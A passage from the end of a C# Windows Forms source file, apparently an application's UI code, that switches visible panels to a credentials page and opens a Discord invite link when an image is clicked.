            mainPage.Visible = false;
            daioPage.Visible = false;
            ssPage.Visible = false;
            credentialsPage.Visible = true;
        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }
    }
}
